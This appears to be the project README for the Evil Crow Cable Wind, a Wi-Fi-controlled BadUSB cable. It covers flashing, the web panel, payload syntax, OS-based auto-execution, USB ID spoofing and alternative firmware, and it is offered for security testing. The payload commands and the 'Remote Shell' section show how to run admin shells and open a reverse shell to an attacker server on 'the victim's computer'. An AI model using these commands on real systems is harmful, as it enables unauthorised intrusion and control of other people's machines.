# EvilCrowCable-Wind

![EvilCrow](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/logo.png)

**Idea, development and implementation:** Joel Serna (@JoelSernaMoreno).

**Firmware collaborators:** Juraj Belko (@s_c_johnson) rustysun9 and Marcejr117.

**Payloads collaborators:** AndrzejRPiotrowski.

**Final PCB design:** April Brother (@aprbrother).

**Manufacturer and distributor:** April Brother (@aprbrother).

**Distributor in the EU:** SAPSAN Cybersec & Military (@SAPSAN_CYBERSEC).

**Distributor in the UK:** KSEC Worldwide (@KSEC_KC).

**Distributor in the NA:** Tienda Espía (@TiendaEspiaMX).

The developers and collaborators of this project do not earn any money from it. 
You can invite me to a coffee to further develop low-cost hacking devices. If you don't invite me, no worries, I will keep developing devices

[![ko-fi](https://www.ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/E1E614OA5)

**Available with April Brother (shipping from China):** 

* USB-A to USB-C:
	
	* Tindie: https://www.tindie.com/products/aprbrother/evilcrowcable-wind-usb-a-to-type-c/
	* Alibaba: https://www.alibaba.com/product-detail/Crow-Cable-wind-USB-A-to_1601279738180.html
	* Aliexpress: https://www.aliexpress.com/item/3256807818385526.html

* USB-C to USB-C: 

	* Tindie: https://www.tindie.com/products/aprbrother/evilcrowcable-wind/
	* Alibaba: https://www.alibaba.com/product-detail/Crow-Cable-wind-based-on-ESP32_1601269809241.html
	* Aliexpress: https://www.aliexpress.com/item/1005007904610809.html

**Available with SAPSAN Cybersec & Military (shipping from EU):**

* USB-A to USB-C:

	* https://sapsan-sklep.pl/en/products/evil-crow-cable-wind-badusb-wifi

* USB-C to USB-C:

	* https://sapsan-sklep.pl/en/products/evil-crow-cable-wind-badusb-wifi

**Available with KSEC Worldwide (shipping from UK):**

* USB-C to USB-C: https://labs.ksec.co.uk/product/evil-crow-wind-usb-c-wifi-enabled-badusb-device/

**Available with Tienda Espía (shipping from Mexico):**

* USB-A to USB-C and USB-C to USB-C:

	* https://tiendaespia.com.mx/producto/evil-crow-cable-wind-badusb-wifi/

**Summary:**

1. Disclaimer
2. Introduction
3. Firmware
	* Flash Mode
	* Installation
	* First steps with Evil Crow Cable Wind
	* Home
	* Payload Editor
	* Payload and Syntax Checker
	* Detect OS
	* Upload Payload
	* List Payloads
	* Payload Viewer
	* AutoExec Planning
	* Config
	* Debug messages
	* HTTP Update
4. Add a new Keyboard Layout
5. Sintax
	* Payload Syntax
	* Keys and Modifiers Syntax
6. Remote Shell
	* Linux/iOS Server
	* Windows Server
	* Android Server
7. Alternative Firmware: USB Army Knife

![Cable](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/cable.jpg)

# Disclaimer

Evil Crow Cable Wind is a basic device for professionals and cybersecurity enthusiasts.

We are not responsible for the incorrect use of Evil Crow Cable Wind.

We recommend using this device for testing, learning and fun :D

Evil Crow Cable Wind © 2024 by Joel Serna Moreno is licensed under CC BY-NC-SA 4.0. To view a copy of this license, visit https://creativecommons.org/licenses/by-nc-sa/4.0/

# Introduction

Evil Crow Cable Wind is a BadUSB device based on ESP32-S3 (It only allows charging of the mobile phone).

Evil Crow Cable Wind can be controlled with a web panel over Wi-Fi, the device is configured in STATION mode. You will need to set up a Wi-Fi access point with your mobile phone or another device, Evil Crow Cable Wind will automatically connect to it.

Evil Crow Cable Wind is pre-configured with English layout (EN_US), but is compatible with other keyboard layouts:

* BE_BE
* BR_BR
* CA_CA
* CA_FR
* DA_DK
* DE_DE
* EN_US
* ES_ES
* FR_FR
* HR_HR
* HU_HU
* IT_IT
* PT_PT
* PT_BR
* SK_SK
* CZ_CZ
* SV_SE
* SI_SI

You can change the keyboard layout in real time from the web panel. 

Additionally, you can use WinPrint and WinPrintLine if you do not know the layout of the victim computer (Windows only).
**Example:** WinPrintLine Hello World!@#/()-:,;0123456789

**NOTE:** 

* **Not all layouts have been tested. If you find any incorrect keys, you can change them and submit a PR to the Evil Crow Cable Wind repository.**

* **All devices have been flashed with basic firmware before shipping.**

* **Please do not request new features in this code. You can develop code for Evil Crow Cable Wind and submit a PR with your new features.**

# Firmware

## Flash Mode

To flash the firmware on Evil Crow Cable Wind you need a magnet.

Place the magnet on the active end of the Evil Crow Cable Wind and connect it to the computer.

![Magnet](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/magnet.jpg)

You can check that the flash mode is correct with the following image:

![Flash Mode](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/flash-mode.png)

## Installation

1. Install esptool: sudo apt install esptool
2. Install pyserial: sudo pip install pyserial
3. Download and Install the Arduino IDE: https://www.arduino.cc/en/main/software
4. Download Evil Crow Cable Wind repository: git clone https://github.com/joelsernamoreno/EvilCrowCable-Wind.git
5. Copy and unzip the USB library included in this repository (EvilCrowCable-Wind/modified-libraries/) to your Arduino library directory
6. Download the ArduinoJson library and place it in your Arduino libraries directory: git clone https://github.com/bblanchon/ArduinoJson.git
7. Open Arduino IDE
8. Go to File - Preferences. Locate the field "Additional Board Manager URLs:" Add "https://espressif.github.io/arduino-esp32/package_esp32_index.json" without quotes. Click "Ok"
9. Select Tools - Board - Boards Manager. Search for "esp32". Install "esp32 by Espressif system version 3.2.0"
10. Flash firmware.ino:
	* Connect active end of the cable with a magnet to the computer
	* Open EvilCrowCable-Wind/firmware/firmware.ino in Arduino IDE
	* Select Tools:
		- Board - "ESP32S3 Dev Module"
    	  	- USB CDC On Boot - "Disabled"
    	  	- CPU Frequency - "80MHz (Wi-Fi)
    	  	- Core Debug Level - "None"
    	  	- USB DFU On Boot - "Disabled"
    	  	- Erase All Flash Before Sketch Upload - "Disabled"
    	  	- Events Run On - "Core 1"
    	  	- Flash Mode - "QIO 80MHZ"
    	  	- Flash Size - "8MB (64Mb)"
    	  	- JTAG Adapter - "Disabled"
    	  	- Arduino Runs On - "Core 1"
    		- USB Firmware MSC On Boot - "Disabled".
    		- Partition Scheme - "8M with SPIFFS (3MB APP/1.5MB SPIFFS)"
    		- PSRAM - "Disabled"
    		- Upload Mode - "UART0 / Hardware CDC"
    		- Upload Speed - "921600"
    		- USB Mode - "Hardware CDC and JTAG"
    		- Zigbee Mode - "Disabled"
    	* Upload firmware

## First steps with Evil Crow Cable Wind

1. Set up a Wi-Fi AP with your mobile phone:
	* SSID: Evil Crow Cable Wind
	* Password: 123456789
2. Disconnect and re-connect the device to the computer (Connect the active end to the computer).
3. Open a browser and access the web panel: http://cable-wind.local/

**Note:** If you cannot access the web panel, use the IP address assigned to Evil Crow Cable Wind or follow below steps **only if you are running Linux OS:**
 * check if avahi-deamon is installed and running on your PC. You can do this with executing "sudo systemctl status avahi-daemon" in terminal
 * If service is not running, install it using your package manager (apt, yum, dnf, Packman, rpm,...)
 * After successful installation, start avahi-daemon service with "sudo systemctl start avahi-daemon && sudo systemctl enable avahi-daemon"
 * In case cable-wind.local is still not reachable, use http://"IP address", where "IP address" is IP assigned to Evil Crow Cable Wind.

## Home

The Home page shows interesting information about the device.

![Home](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/home.png)

## Payload Editor

The Payload Editor page allows you to run payloads, save payloads, or edit payloads stored in the device:

* You can use the "Run Payload" option to run the payload.
* You can use the "Save Payload" option to save the payload in memory. Optionally, you can add a descriptive name and a brief explanation of what the payload does.
* You can find the syntax for commands and modifier keys in the web panel.

![LivePayload](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/livepayload.png)

![LivePayload](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/livepayload2.png)

![LivePayload](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/livepayload3.png)

## Payload and Syntax Checker

Livepayload includes a payload and syntax checker that lets you verify whether your payload is valid or not:

![PayloadChecker](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/payload-valid.png)

![PayloadChecker](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/payload-error.png)

Additionally, the payload and syntax checker helps you write payloads by providing suggestions. You can use the TAB key to autocomplete some commands. Example:

* Type Pri in the input field
* TAB (autocompletes to Print)
* TAB (autocompletes to PrintLine)

Finally, it also includes a syntax checker. If you type a command that's incomplete or incorrect, it will provide guidance on the correct syntax:

![PayloadChecker](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/syntax-printline.png)

![PayloadChecker](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/syntax-delay.png)

## Detect OS

Evil Crow Cable Wind can detect the operating system and display it on the home screen of the web panel.

![DetectOS](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/detectos-na.png)

You can detect the victim's operating system by clicking on the 'N/A' label:

![DetectOS](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/detectos-detect.png)

Use the DetectOS command from livepayload to get the victim's operating system:

![DetectOS](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/detectos-payload.png)

This is a BETA feature. Currently it can detect the following operating systems: Windows, Linux, MacOS, Android, iOS and ChromeOS (ChromeOS Flex). Please open an issue if you experience any issues with OS detection.

![DetectOS](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/detectos-windows.png)

![DetectOS](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/detectos-linux.png)

![DetectOS](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/detectos-macos.png)

![DetectOS](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/detectos-android.png)

![DetectOS](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/detectos-ios.png)

![DetectOS](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/detectos-chromeos.png)

## Upload Payload

The Upload Payload page allows you to upload and store payloads in memory.

![Upload](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/upload.png)

**Note:** Check the available memory on the Home page.

## List Payloads

The Payload List page allows you to view the payloads stored in memory.

![Payloads](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/payloads.png)

## Payload viewer

List Payload includes a payload viewer and editor that lets you view, edit, delete, or execute payloads stored in memory:

![PayloadViewer](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/payload-viewer.png)

## AutoExec Planning

AutoExec Planning lets you configure multiple payloads to run automatically based on the detected operating system.

First, upload the payloads in the “Upload Payload” section (one for each operating system). Then, assign a payload to each OS here:

![AutoExec](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/autoexec.png)

Click the 'Select OS' button to assign a payload to a specific operating system:

![AutoExec](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/autoexec-selectos.png)

The screenshot below shows the AutoExec settings for different operating systems:

![AutoExec](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/autoexec-config.png)

**Demo:** [AutoExec Planning](https://www.youtube.com/watch?v=2BlDNNnZgoM)

## Config

The Config page allows you to change the Keyboard Layout, Wi-Fi configuration or USB configuration.

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/config.png)

* **Set Layout:**

Configure the keyboard layout. Keyboard Layout changes are stored.

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/set-layout.png)

* **Set Wi-Fi Config:**

SSID and password of your Wi-Fi access point. Wi-Fi configuration changes are stored. Evil Crow Cable Wind will restart when changes are applied.

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/set-wifi.png)

* **Set Backup Wi-Fi Config:**

You can configure a secondary Wi-Fi access point. WiFi and backup WiFi are configured so that it always tries to connect to the primary WiFi first. If the primary is not found, it will connect to the backup. If the primary is found but the connection fails, it will then try the backup as well.

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/set-wifi-backup.png)

* **Delete Wi-Fi Config and Backup Wi-Fi Config:**

Delete Wi-Fi and Backup configuration file. Evil Crow Cable Wind will restart and connect to the default Wi-Fi access point (SSID: Evil Crow Cable Wind / Password: 123456789).

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/delete-configwifi.png)

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/delete-configwifi-backup.png)

* **Set USB Config:**

Configure Vendor ID, Product ID, Product Name y Manufacturer Name. USB Configuration changes are stored. Evil Crow Cable Wind will restart when changes are applied.

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/set-usb.png)

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/vid-pid.png)

**Note:** Be sure to enter the correct data, or you may risk bricking the device. Additional VendorID/ProductIDs available on: https://devicehunt.com/all-usb-vendors

* **Delete USB Config:**

Delete USB configuration file. Evil Crow Cable Wind will restart and configure itself with the default USB configuration.

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/delete-usb.png)

* **Set Hostname Config:**

Change the hostname to access the web panel with another name:

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/set-hostname.png)

* **Forces reload of CSS/JS files:**

Forces reload of CSS/JS files if they were cached:

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/css-js-files.png)

* **Reboot Device:**

Reboot device remotely:

![Config](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/reboot.png)

## Debug messages

Debug messages will be displayed for each feature in the web panel:

![Debug](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/debug-payload.png)

![Debug](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/debug-layout.png)

![Debug](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/debug-save.png)

## HTTP Update

You can update the firmware without a magnet:

1. Open firmware.ino in the Arduino IDE
2. Configure the options as described in the 'Installation' section
3. Click on sketch -> Export Compiled Binary

This will create the binaries:

* EvilCrowCable-Wind/firmware/build/esp32.esp32.esp32s3/

![Binaries](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/binaries.png)

4. Set up a Wi-Fi access point for Evil Crow Cable Wind and your computer
5. Connect Evil Crow Cable Wind to the Wi-Fi AP and your computer (without magnet)
6. Connect your computer to the Wi-Fi AP
7. Open a terminal in EvilCrowCable-Wind/firmware/build/esp32.esp32.esp32s3/
8. Flash the binary firmware.ino.bin with the following command: curl -F "image=@firmware.ino.bin" cable-wind.local/update

![Update](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/update.png)

**NOTE:** The compiled firmware is located in the EvilCrowCable-Wind/compiled/ folder.

# Add a new Keyboard Layout

If you want to add a new keyboard layout:

1. Go to the Arduino libraries directory and create your layout in USB/src/layouts/

**Note:** Use the other layouts for reference.

![Add Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/add-layout.png)

2. Modify USB/src/USBHIDKeyboard.h and include your new layout.

![Include Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/include-layout.png)

3. Modify the firmware.ino to change your layout in real time.

![Firmware Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/firmware-layout.png)

![Firmware Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/firmware-layout1.png)

4. Modify config.h in firmware.ino to change to your new layout from the web panel.

![Web Layout](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/web-layout.png)

5. Flash firmware.ino again.

# Sintax

## Payload Syntax

To develop Evil Crow Cable Wind payloads, you need to know the syntax of the interpreter. All the commands allowed in the interpreter are listed here:

| Command | Example | Description |
| ------- | ------- | ----------- |
| `ServerConnect` | `ServerConnect IP` |Read the "Remote Shell" section for more information |
| `DetectOS` | `DetectOS` |Detect the operating system |
| `RunWin` | `RunWin cmd` |Runs a command or a program on the victim's computer |
| `RunPowershellAdmin` | `RunPowershellAdmin` | Run powershell as administrator |
| `RunCmdAdmin` | `RunCmdAdmin` | Run cmd as administrator |
| `ShellWin` | `ShellWin IP` | Read the "Remote Shell" section for more information |
| `RunNix` | `RunNix gedit` | Runs a command or a program on the victim's computer |
| `RunLauncher` | `RunLauncher libreoffice` | Runs a command or a program on the victim's computer |
| `CtrlAltT` | `CtrlAltT` | Run a terminal on the victim's computer |
| `ShellNix` | `ShellNix IP` | Read the "Remote Shell" section for more information |
| `ShellMac` | `ShellMac IP` | Read the "Remote Shell" section for more information |
| `ShellMacCleanup` | `ShellMacCleanup` | Read the "Remote Shell" section for more information |
| `RunMac` | `RunMac terminal` | Runs a command or a program on the victim's computer |
| `GuiR` | `GuiR` | Press WINDOWS+R on the victim's computer |
| `Gui` | `Gui` | Press WINDOWS on the victim's computer |
| `AltF2` | `AltF2` | Press ALT+F2 on the victim's computer |
| `GuiSpace` | `GuiSpace` | Press WINDOWS+SPACE on the victim's computer |
| `Print` | `Print Hello World!` | Prints a text on the victim's computer |
| `WinPrint` | `WinPrint Hello World!` | Print a text on the victim's computer without knowing the layout (Windows only) |
| `PrintLine` | `PrintLine Hello World!` | Prints a text and presses the ENTER key on the victim's computer |
| `WinPrintLine` | `WinPrintLine Hello World!` | Prints a text and presses the ENTER key on the victim's computer without knowing the layout (Windows only) |
| `Delay` | `Delay 5000` | Delay in ms |
| `Press` | `Press KEY_ENTER` | Press a key or modifier on the victim's computer |
| `PressRelease` | `PressRelease KEY_ENTER` | Press and Release a key or modifier on the victim's computer |
| `Release` | `Release` | Release all pressed keys |

**NOTE:** You can find payloads for Evil Crow Cable Wind in this repository (EvilCrowCable-Wind/payloads).

## Keys and Modifiers Syntax

**MODIFIERS:**

| Modifiers | Example | 
| ------- | ------- |
| `KEY_LEFT_ALT` | `Press KEY_LEFT_ALT` |
| `KEY_LEFT_GUI` | `Press KEY_LEFT_GUI` |
| `KEY_LEFT_CTRL` | `Press KEY_LEFT_CTRL` |
| `KEY_LEFT_SHIFT` | `Press KEY_LEFT_SHIFT` |
| `KEY_RIGHT_ALT` | `Press KEY_RIGHT_ALT` |
| `KEY_RIGHT_GUI` | `Press KEY_RIGHT_GUI` |
| `KEY_RIGHT_CTRL` | `Press KEY_RIGHT_CTRL` |
| `KEY_RIGHT_SHIFT` | `Press KEY_RIGHT_SHIFT` |

**STANDARD KEYS:**

| Keys | Example |
| ------- | ------- |
| `a` - `z` | `Press r` or `PressRelease r`|
| `A` - `Z` | `Press A` or `PressRelease A`|
| `0` - `9` | `Press 1` or `PressRelease 1`|
| `Special characters` | `Press @` or `PressRelease @`|

**OTHER KEYS:**

| Other Keys | Example |
| ------- | ------- |
| `KEY_ENTER` | `Press KEY_ENTER` or `PressRelease KEY_ENTER`|
| `KEY_UP_ARROW` | `Press KEY_UP_ARROW` or `PressRelease KEY_UP_ARROW`|
| `KEY_DOWN_ARROW` | `Press KEY_DOWN_ARROW` or `PressRelease KEY_DOWN_ARROW`|
| `KEY_LEFT_ARROW` | `Press KEY_LEFT_ARROW` or `PressRelease KEY_LEFT_ARROW`|
| `KEY_RIGHT_ARROW` | `Press KEY_RIGHT_ARROW` or `PressRelease KEY_RIGHT_ARROW`|
| `KEY_BACKSPACE` | `Press KEY_BACKSPACE` or `PressRelease KEY_BACKSPACE`|
| `KEY_TAB` | `Press KEY_TAB` or `PressRelease KEY_TAB`|
| `KEY_PAUSE` | `Press KEY_PAUSE` or `PressRelease KEY_PAUSE`|
| `KEY_INSERT` | `Press KEY_INSERT` or `PressRelease KEY_INSERT`|
| `KEY_DELETE` | `Press KEY_DELETE` or `PressRelease KEY_DELETE`|
| `KEY_PAGE_UP` | `Press KEY_PAGE_UP` or `PressRelease KEY_PAGE_UP`|
| `KEY_PAGE_DOWN` | `Press KEY_PAGE_DOWN` or `PressRelease KEY_PAGE_DOWN`|
| `KEY_ESC` | `Press KEY_ESC` or `PressRelease KEY_ESC`|
| `KEY_SPACE` | `Press KEY_SPACE` or `PressRelease KEY_SPACE`|
| `KEY_HOME` | `Press KEY_HOME` or `PressRelease KEY_HOME`|
| `KEY_END` | `Press KEY_END` or `PressRelease KEY_END`|
| `KEY_CAPS_LOCK` | `Press KEY_CAPS_LOCK` or `PressRelease KEY_CAPS_LOCK`|
| `KEY_PRINT_SCREEN` | `Press KEY_PRINT_SCREEN` or `PressRelease KEY_PRINT_SCREEN`|
| `KEY_SCROLL_LOCK` | `Press KEY_SCROLL_LOCK` or `PressRelease KEY_SCROLL_LOCK`|
| `KEY_NUM_LOCK` | `Press KEY_NUM_LOCK` or `PressRelease KEY_NUM_LOCK`|
| `KEY_MENU` | `Press KEY_MENU` or `PressRelease KEY_MENU`|
| `LED_NUMLOCK` | `Press LED_NUMLOCK` or `PressRelease LED_NUMLOCK`|
| `LED_CAPSLOCK` | `Press LED_CAPSLOCK` or `PressRelease LED_CAPSLOCK`|
| `LED_SCROLLLOCK` | `Press LED_SCROLLLOCK` or `PressRelease LED_SCROLLLOCK`|
| `LED_COMPOSE` | `Press LED_COMPOSE` or `PressRelease LED_COMPOSE`|
| `LED_KANA` | `Press LED_KANA` or `PressRelease LED_KANA`|
| `KEY_F1` | `Press KEY_F1` or `PressRelease KEY_F1`|
| `KEY_F2` | `Press KEY_F2` or `PressRelease KEY_F2`|
| `KEY_F3` | `Press KEY_F3` or `PressRelease KEY_F3`|
| `KEY_F4` | `Press KEY_F4` or `PressRelease KEY_F4`|
| `KEY_F5` | `Press KEY_F5` or `PressRelease KEY_F5`|
| `KEY_F6` | `Press KEY_F6` or `PressRelease KEY_F6`|
| `KEY_F7` | `Press KEY_F7` or `PressRelease KEY_F7`|
| `KEY_F8` | `Press KEY_F8` or `PressRelease KEY_F8`|
| `KEY_F9` | `Press KEY_F9` or `PressRelease KEY_F9`|
| `KEY_F10` | `Press KEY_F10` or `PressRelease KEY_F10`|
| `KEY_F11` | `Press KEY_F11` or `PressRelease KEY_F11`|
| `KEY_F12` | `Press KEY_F12` or `PressRelease KEY_F12`|

# Remote Shell

Evil Crow Cable Wind allows you to execute commands remotely on a computer without a network connection.

Evil Crow Cable Wind uses port 4444 for communication. If you want to change this, modify firmware.ino:

![Port](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/port.png)

You have several ways to run Evil Crow Server.

* Linux and iOS: evilcrow-server.py --port {PORT} --target {windows, linux or mac}
* Android: evilcrow-server.apk (Install the APK on an android phone. Default port 4444)
* Windows: evilcrow-server.exe --port {PORT}

## Linux/iOS Server

1. Run evilcrow-server.py to start the attack:

	* Windows Target: python evilcrow-server.py --port 4444 --target windows
	* Linux Target: python evilcrow-server.py --port 4444 --target linux
	* MacOS Target: python evilcrow-server.py --port 4444 --target macos
	
![Server](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/server.png)

2. Go to the web panel and type the following payload from Live Payload:

	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
	* MacOS Target: ShellMac "Evil Crow server IP" (example: ShellMac 192.168.85.230)
	
3. Click on 'Run Payload'.

## Windows Server

1. Run evilcrow-server.exe to start the attack:

	* Windows, Linux or MacOS Target: evilcrow-server.exe --port 4444

2. Go to the web panel and type the following payload from Live Payload:

	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
	* MacOS Target: ShellMac "Evil Crow server IP" (example: ShellMac 192.168.85.230)
	
3. Click on 'Run Payload'.

![Server](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/server-windows.png)

## Android Server

1. Open Evil Crow Server APP

2. Go to the web panel and type the following payload from Live Payload:

	* Windows Target: ShellWin "Evil Crow server IP" (example: ShellWin 192.168.85.230)
	* Linux Target: ShellNix "Evil Crow server IP" (example: ShellNix 192.168.85.230)
	* MacOS Target: ShellMac "Evil Crow server IP" (example: ShellMac 192.168.85.230)

3. Click on 'Run Payload'.

![Server](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/server-android.jpg)

**Demo:** [Remote Shell](https://www.youtube.com/watch?v=FmkIHYdOxS4)

# Alternative Firmware: USB Army Knife

USB Army Knife is a powerful and compact offensive security tool designed for penetration testers, red teamers, and security researchers. Built primarily for ESP32-S3 based devices like the LilyGo T-Dongle S3, it combines multiple USB attack vectors and wireless capabilities into one highly flexible platform.
The firmware enables a wide range of attacks, including:

* USB HID (BadUSB) attacks using DuckyScript.
* Mass storage emulation with covert payload delivery.
* USB Ethernet adapter impersonation for network sniffing and traffic capture.
* WiFi and Bluetooth exploits via an enhanced fork of ESP32 Marauder.
* Hot mic and screen capture streamed over WiFi.
* Triggering attacks remotely, on a timer, or via an onboard UI.
* Covert command and control through a serial interface, even when the target machine is locked.

The system includes a mobile-friendly web interface for deploying and managing attacks, allowing full control using just a smartphone.

USB Army Knife supports various hardware platforms, mainly those based on ESP32-S3, with some functionality on ESP32-S2 and limited support for RP2040 devices. It is open-source and can be flashed via a browser or built from source.

In short, USB Army Knife is a versatile, low-cost, and covert physical access tool that fuses the best of HID, network, wireless, and storage-based attacks into a single USB device.

USB Army Knife is also compatible with the Evil Crow Cable Wind. However, due to hardware limitations (notably the lack of a microSD card slot, screen, and external buttons), some features are restricted. Instead, the internal flash memory is used to store payloads and data, which reduces overall capacity and flexibility. Additionally, thermal throttling may activate when running WiFi access points for long durations, but this can be mitigated by connecting the device to an existing WiFi network or disabling WiFi entirely.

Below is how to install the firmware:

1. The first step is to download and install Visual Studio Code: https://code.visualstudio.com/Download

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/vscode-webpage.png)

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/vscode-installed.png)

2. The next step is to download and install the PlatformIO extension for Visual Studio Code, which is required for building and flashing the firmware:

* Open VSCode Extension Manager.
* Search for official PlatformIO IDE extension.
* Install PlatformIO IDE.

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/vscode-extension-manager.png)

3. Download the USB Army Knife repository: https://github.com/i-am-shodan/USBArmyKnife/

4. Now that you have cloned the repository, you need to initialize and update the submodules. To do this, run the following command inside the directory you just cloned: git submodule update --init

5. Open Visual Studio Code, then go to File > Open Folder and select the USB Army Knife directory:

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/vscode-usbarmyknife.png)

6. Click on the PlatformIO icon (the alien head) located in the Activity Bar on the left side of Visual Studio Code:

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/platformio-icon.png)

7. In the menu, expand the section for the device you want to flash. For the Evil Crow Cable Wind, you should expand 'Evil-Crow-Cable-Wind':

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/platformio-evilcrowcablewind.png)

8. Connect the Evil Crow Cable Wind to your computer in flash mode (with a magnet). Once connected, click "Upload" in PlatformIO to flash the firmware to the device:

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/platformio-upload.png)

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/platformio-flashed.png)

9. Next, you need to modify the autorun.ds file located in the data directory. Replace its contents with the following script to configure the Evil Crow Cable Wind to connect to an existing Wi‑Fi access point:

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/platformio-data-directory.png)

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/platformio-autorun-script.png)

When connecting to an existing Wi‑Fi access point, the Evil Crow Cable Wind will use the following default credentials:

* **SSID:** USBArmyKnife_AP
* **Password:** 123456789

This means the device will attempt to connect to a Wi‑Fi network with the SSID USBArmyKnife_AP and the password 123456789.

**NOTE:** You can modify these values in the autorun.ds file to match the SSID and password of the Wi‑Fi network you want the device to join.

10. As the next step, navigate to Project Tasks → Evil-Crow-Cable-Wind → Platform, and click on “Upload Filesystem Image”. This will upload the contents of the data directory to the internal storage of the Evil Crow Cable Wind device:

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/platformio-upload-image.png)

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/platformio-filesystem-uploaded.png)

11. Next, disconnect the Evil Crow Cable Wind from your computer. Then, set up a Wi‑Fi Access Point using a mobile phone or another device.  The Wi-Fi Access Point must be configured as follows:

* **SSID:** USBArmyKnife_AP
* **Password:** 123456789

Once the access point is active, reconnect the Evil Crow Cable Wind to your computer without using a magnet, so that it powers on in normal mode (not flash mode). The device will attempt to connect to the specified Wi‑Fi network automatically.

12. Finally, connect the attacker's computer to the same Wi‑Fi access point, then determine the IP address assigned to the Evil Crow Cable Wind (e.g., by checking the connected devices list on your router or mobile hotspot). Once you have the IP address, open a browser and navigate to:

* http://[DEVICE_IP]:8080/

**NOTE:** Replace [DEVICE_IP] with the actual IP address assigned to the device.

![USBArmyKnife](https://github.com/joelsernamoreno/EvilCrowCable-Wind/blob/main/images/usbarmyknife-webpanel.png)

For detailed information on how to use the USB Army Knife firmware, please refer to the official documentation available in its GitHub repository: https://github.com/i-am-shodan/USBArmyKnife/
